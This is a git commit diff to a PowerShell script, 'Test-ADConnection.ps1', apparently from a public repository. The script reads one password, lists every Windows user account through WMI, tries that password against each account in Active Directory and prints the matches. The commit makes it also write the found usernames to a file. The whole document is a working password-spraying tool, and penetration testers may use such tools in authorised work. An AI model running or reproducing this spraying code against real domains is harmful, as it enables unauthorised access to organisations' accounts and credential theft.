d95e2f200e8f6ba4fd8701468e27e981e46974c8
Yuval Saban <62604022+YuvalSab@users.noreply.github.com>
2023-01-06 17:54:38 +0200

    Update Test-ADConnection.ps1

--- Test-ADConnection.ps1
+++ Test-ADConnection.ps1
@@ -10,11 +10,14 @@ Function Test-ADConnection {
 $password = Read-Host 'Enter A Password'
 $Counter = 0 
 $total = (Get-WmiObject -Class Win32_UserAccount | Measure-Object).Count
+$DomainName = (Get-WmiObject -Class Win32_UserAccount | Select-Object -Index 10).Domain
+
 Get-WmiObject -Class Win32_UserAccount | ForEach-Object{
     $UserName = $_.Caption
     $auth = Test-ADConnection -username $UserName -password $password
     if($auth -eq "True"){
         Write-Host -ForegroundColor Green ("[+] {0}:{1}" -f $UserName,$password)
+        $UserName -replace "$DomainName\\"| Out-File UsersFound.txt -Append
     }
     Write-Progress -Activity "In Progress" -Status  "$Counter/$total Completed" -PercentComplete($Counter/$total*100)
     $Counter++    
